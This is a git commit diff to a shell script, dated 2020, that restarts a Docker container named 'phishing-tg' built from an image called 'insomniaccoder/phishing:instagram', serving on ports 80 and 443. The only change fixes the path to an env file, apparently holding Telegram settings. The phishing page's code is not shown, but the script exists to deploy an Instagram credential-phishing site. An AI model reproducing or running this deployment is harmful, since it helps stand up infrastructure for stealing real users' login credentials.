4c235f20064d8b500a9957ed42e149899ee410ee
Harsh Singhvi <harshsinghvi98@gmail.com>
2020-06-29 11:55:12 +0530

    fixing

--- script.sh
+++ script.sh
@@ -1,4 +1,4 @@
 docker stop phishing-tg 
 docker rm phishing-tg 
-docker run --env-file ../tg.env --name phishing-tg -d -p 80:80 -p 443:443 -v $PWD/src:/var/www/html/ insomniaccoder/phishing:instagram
+docker run --env-file tg.env --name phishing-tg -d -p 80:80 -p 443:443 -v $PWD/src:/var/www/html/ insomniaccoder/phishing:instagram
 echo "Hello World !!"
